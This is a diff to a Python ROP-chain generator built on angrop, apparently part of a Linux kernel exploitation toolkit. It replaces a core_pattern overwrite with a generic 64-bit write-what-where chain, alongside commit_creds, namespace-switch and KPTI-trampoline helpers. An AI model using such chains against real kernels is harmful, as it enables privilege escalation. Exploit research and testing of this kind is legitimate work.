@@ -149,7 +149,7 @@ class RopGeneratorAngrop:
     def _mov_reg_rax(self, reg_name):
         chain_mov_regs = self._rop.move_regs(**{reg_name: "rax"})
         items = []
-        for value, rebased in chain_mov_regs._concretize_chain_values(): # pylint: disable=protected-access
+        for value, rebased in chain_mov_regs._concretize_chain_values():  # pylint: disable=protected-access
             if rebased:
                 items.append(RopChainOffset(value))
             else:
@@ -161,7 +161,7 @@ class RopGeneratorAngrop:
         """Finds the shortest ROP gadget with a single memory write where the address is controlled by 'rsi' 
         and the data is controlled by 'rdi', writing 64 bits of data."""
 
-        #TODO use angrop directly when issue is handled
+        # TODO use angrop directly when issue is handled
 
         shortest_gadget = None
 
@@ -211,7 +211,6 @@ class RopGeneratorAngrop:
         chain.add_value(0)
         chain.add_value(0)
         return chain
-    
 
     def _find_kpti_trampoline(self):
         """Finds the address of the kPTI trampoline.
@@ -244,7 +243,8 @@ class RopGeneratorAngrop:
         """
         payload = ""
 
-        concrete_vals = rop_chain._concretize_chain_values() # pylint: disable=protected-access
+        concrete_vals = rop_chain._concretize_chain_values(
+        )  # pylint: disable=protected-access
         for value, rebased in concrete_vals:
 
             instruction_code = ""
@@ -370,24 +370,18 @@ class RopGeneratorAngrop:
 
     def rop_action_fork(self):
         return RopChain([self._find_symbol(FORK)])
-    
-    def rop_action_core_pattern_overwrite(
-            self, overwrite_value_1: RopChainConstant | RopChainArgument,
-            overwrite_value_2: RopChainConstant | RopChainArgument = None):
 
+    def rop_action_write_what_where_64(self, address, value):
+        """Constructs a rop chain to write a 64 bit value to an address.
+
+        Returns:
+           RopChain: The constructed ROP chain.
+        """
         items = [RopChainOffset(self._find_pop_one_reg("rdi")),
-                 self._find_symbol(CORE_PATTERN),
+                 address,
                  RopChainOffset(self._find_pop_one_reg("rsi")),
-                 overwrite_value_1,
+                 value,
                  RopChainOffset(self.find_memory_write())]
-
-        if overwrite_value_2:
-            items.extend([
-                RopChainOffset(self._find_pop_one_reg("rdi")),
-                RopChainOffset(self._find_symbol_addr(CORE_PATTERN) + 8),
-                RopChainOffset(self._find_pop_one_reg("rsi")),
-                overwrite_value_2,
-                RopChainOffset(self.find_memory_write())])
 
         return RopChain(items)
 
@@ -413,6 +407,9 @@ if __name__ == "__main__":
     action_commit_creds = rop_generator.rop_action_commit_creds()
     print("Commit Creds\n" + repr(action_commit_creds) + '\n\n')
     action_switch_task_namespace = rop_generator.rop_action_switch_task_namespaces()
-    print("Switch task Namepspace\n" + repr(action_switch_task_namespace) + '\n\n')
-    action_core_pattern_overwrite = rop_generator.rop_action_core_pattern_overwrite(RopChainConstant(1234), RopChainConstant(5678))
-    print("Core Pattern Overwrite\n" + repr(action_core_pattern_overwrite) + '\n\n')
+    print("Switch task Namepspace\n" +
+          repr(action_switch_task_namespace) + '\n\n')
+    action_write_what_where_64 = rop_generator.rop_action_write_what_where_64(
+        RopChainConstant(0x414141414141), RopChainConstant(5678))
+    print("Write What Where (64 bits)\n" +
+          repr(action_write_what_where_64) + '\n\n')
